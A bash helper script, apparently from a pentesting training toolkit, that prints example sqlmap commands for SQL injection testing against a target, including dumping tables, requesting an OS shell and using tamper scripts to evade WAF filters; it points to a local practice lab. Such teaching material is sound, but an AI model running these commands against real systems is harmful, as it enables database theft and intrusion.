#!/usr/bin/env bash
# sqlmap/examples.sh — Automatic SQL injection detection and exploitation
source "$(dirname "$0")/../common.sh"

show_help() {
    cat <<'EOF'
Usage: examples.sh <target>

Description:
  SQLMap - Automatic SQL injection detection examples.
  Displays common sqlmap commands for testing SQL injection vulnerabilities.

Examples:
  examples.sh http://example.com/page
  examples.sh http://10.0.0.1:8080/login
EOF
    exit 0
}

[[ "${1:-}" =~ ^(-h|--help)$ ]] && show_help

require_cmd sqlmap "brew install sqlmap"
require_target "${1:-}"
safety_banner

TARGET="$1"

info "=== SQLMap Examples ==="
info "Target: ${TARGET}"
echo ""

# 1. Basic URL test for SQL injection
info "1) Test a URL parameter for injection"
echo "   sqlmap -u '${TARGET}?id=1'"
echo ""

# 2. Test with POST data
info "2) Test POST parameters"
echo "   sqlmap -u '${TARGET}' --data='username=admin&password=test'"
echo ""

# 3. Enumerate databases
info "3) List all databases"
echo "   sqlmap -u '${TARGET}?id=1' --dbs"
echo ""

# 4. Enumerate tables in a database
info "4) List tables in a database"
echo "   sqlmap -u '${TARGET}?id=1' -D <database> --tables"
echo ""

# 5. Dump a table
info "5) Dump table contents"
echo "   sqlmap -u '${TARGET}?id=1' -D <database> -T <table> --dump"
echo ""

# 6. Get current user and database
info "6) Get current DB user info"
echo "   sqlmap -u '${TARGET}?id=1' --current-user --current-db"
echo ""

# 7. Test all parameters automatically
info "7) Auto-detect and test all parameters"
echo "   sqlmap -u '${TARGET}?id=1&name=test' --batch"
echo ""

# 8. Use a specific injection technique
info "8) Specify injection techniques"
echo "   sqlmap -u '${TARGET}?id=1' --technique=BEU"
echo "   # B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline"
echo ""

# 9. OS shell (if DB user has privileges)
info "9) Attempt OS shell access"
echo "   sqlmap -u '${TARGET}?id=1' --os-shell"
echo ""

# 10. Tamper scripts (bypass WAF)
info "10) Use tamper scripts to evade filters"
echo "    sqlmap -u '${TARGET}?id=1' --tamper=space2comment,between"
echo ""

# Interactive demo (skip if non-interactive)
[[ ! -t 0 ]] && exit 0

warn "Use --batch for non-interactive mode (accepts defaults)"
warn "Use --output-dir=./sqlmap-output to save results"
info "Practice target: make lab-up, then test http://localhost:8080"
